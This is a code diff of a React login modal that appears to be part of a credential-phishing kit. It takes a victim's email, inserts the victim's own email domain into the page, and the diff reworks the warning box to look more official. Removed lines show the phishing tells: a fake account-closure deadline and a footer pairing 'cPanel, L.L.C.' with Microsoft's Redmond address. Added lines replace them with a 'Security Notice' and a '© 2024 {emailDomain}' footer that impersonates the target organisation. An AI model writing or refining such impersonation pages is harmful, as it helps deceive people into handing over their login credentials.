@@ -322,23 +322,37 @@ const LoginModal = ({ email, styles= {}, loginURL= 'NOT PROVIDED' }) => {
             </button>
           </div> */}
 
-          {/* Add Warning Section */}
+          {/* Warning Section - Redesigned */}
           <div style={{
             marginTop: '2rem',
-            padding: '1rem',
-            backgroundColor: '#F3F4F6',
+            padding: '1.25rem',
+            backgroundColor: '#FEF2F2',
             borderRadius: '0.75rem',
             fontSize: '0.875rem',
-            color: '#4B5563',
-            lineHeight: '1.5'
+            border: '1px solid #FEE2E2',
+            color: '#991B1B'
           }}>
-            <div style={{ fontWeight: '600', marginBottom: '0.5rem', color: '#DC2626' }}>WARNING</div>
-            <p>
-              This information system is the property of {emailDomain}.
-              Unauthorized or improper use of this system may result in administrative disciplinary action. After 24 hours, we closed all previous and un-verified accounts.
+            <div style={{ 
+              display: 'flex', 
+              alignItems: 'center', 
+              gap: '0.5rem',
+              marginBottom: '0.75rem' 
+            }}>
+              <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+                <path d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM10 11a.75.75 0 01-.75-.75V7.5a.75.75 0 011.5 0v2.75a.75.75 0 01-.75.75zm0 3a1 1 0 100-2 1 1 0 000 2z" fill="currentColor"/>
+              </svg>
+              <span style={{ fontWeight: '600' }}>Security Notice</span>
+            </div>
+            <p style={{ lineHeight: '1.5' }}>
+              This system is the property of {emailDomain}. Unauthorized access is prohibited.
             </p>
-            <p style={{ marginTop: '0.5rem', fontSize: '0.8rem', color: '#6B7280' }}>
-              cPanel, L.L.C. • One Microsoft Way • Redmond, WA 98052. You are receiving this notification because your account is active on our server.
+            <p style={{ 
+              marginTop: '0.75rem', 
+              fontSize: '0.75rem', 
+              color: '#9B1C1C',
+              opacity: 0.8 
+            }}>
+              © 2024 {emailDomain} • All rights reserved
             </p>
           </div>
         </div>
